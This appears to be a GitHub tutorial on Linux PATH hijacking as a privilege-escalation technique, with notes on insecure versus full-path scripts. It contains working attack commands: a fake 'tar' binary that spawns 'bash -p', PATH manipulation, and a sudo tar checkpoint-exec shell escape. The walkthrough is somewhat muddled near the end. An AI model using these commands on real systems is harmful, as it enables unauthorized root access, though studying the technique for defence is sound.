<h1 align="center"> PATH Hijacking </h1>




## Content Table:


## What is Path Hijacking?
**PATH Hijacking**: Is a privilege escalation technique where an attacker exploits the way linux systems search for executable programs. By manipulating the PATH environment variable, an attacker can trick privileged programs into executing malicious code instead of legitimate system binaries.

- When we launch a program, for example in the shell, we typically just write the name of the program. For exmaple, if I want to list out all the files in a given directory, I can use the `ls` program as follows.



## How is the Path hijackign used?
Path hijacking is used by planting a malicious binary in a writable directory that appears earlier in `$PATH`. When a privileged process calls a command without its full path, your binary runs instead, giving you elevated privileges.



## Understanding the PATH Environment Variable

### What is the PATH?
The `PATH` is an environment variable that tells the shell which directories to search for executable files when you type a command.
- View PATH:
````
echo $PATH
````
<img width="742" height="93" alt="image" src="https://github.com/user-attachments/assets/75fc2e4a-0364-49b5-9427-6d41cd245782" />

### How Command Execution Wors:
1. I type `ls`
2. System searches directories in this order:
   - `/usr/local/sbin/ls`
   - `/usr/local/bin/ls`
   - `/usr/sbin/ls`
   - `/usr/bin/ls` ‚Üê FOUND HERE!
   - `/sbin/ls`
   - `/bin/ls`
   - ...and so on




### The Vulnerability Explained

#### Scenario:
A script or program calls system commands without using full paths:

- Vulnerable Code:
````
#!/bin/bash
ls -la /home/
````
- This is vulnerable - uses relative command


- **Secure Code**:
````
#!/bin/bash
/bin/ls -la /home/
````
- This is secure - uses full path


- **The Attack**:
If an attacker can control what "ls" means by manipulating PATH, they can execute their own code with the privileges of the vulnerable script.

---






# Path Hijacking Methodology 

## Basic Usage PATH:
- Now, how does the shell process know which command to execute?
Remember that in modern operating systems, resources are located in specific paths of a file system. All sorts of resources are located like that. Even binaries, which are the programs we use to do various activities.
- This means that before executing the command, the shell needs to resolve its full path, that is, it needs to know where does the program reside within the file system. This is where the concept of a PATH comes in.
- IMPORTANT: The PATH is an environment variable, found within the shell and other processes as well, which determines the folders to look in order to resolve command names into full paths."



- If i type:
````
ls
````
<img width="902" height="99" alt="image" src="https://github.com/user-attachments/assets/ff57d6ed-793f-4320-a997-13d756612c8e" />


````
echo $PATH
````
<img width="763" height="91" alt="image" src="https://github.com/user-attachments/assets/f5d038d3-7f0c-49f6-a768-5cce1707ccb5" />

- In this we see:
````
/home/lowpriv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
````
- If `/home/lowpriv/bin` comes before `/bin`, you can hijack `tar`.


- Create a Malicious Binary
````
mkdir -p /home/lowpriv/bin
echo -e '#!/bin/bash\nbash -p' > /home/lowpriv/bin/tar
chmod +x /home/lowpriv/bin/tar
````
<img width="852" height="144" alt="image" src="https://github.com/user-attachments/assets/ecd1b01c-af00-418f-8745-00a40b003d37" />


- This fake `tar` just spawns a root shell using `bash -p`, which preserves elevated privileges.


- Prepend your malicious path to `$PATH`:
````
export PATH=/home/lowpriv/bin:$PATH
which tar
````
<img width="642" height="138" alt="image" src="https://github.com/user-attachments/assets/54c1e47e-00c1-4386-a699-f661dda8eb53" />


- Run 
````
sudo -l
sudo tar
````
<img width="955" height="260" alt="image" src="https://github.com/user-attachments/assets/536767fd-3c83-4e24-b821-a67d5b53ccf4" />

- But in this we need `root`.

````
su -
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
````

<img width="954" height="413" alt="image" src="https://github.com/user-attachments/assets/3e65258d-4934-488c-8c78-f66bfafaeeed" />

























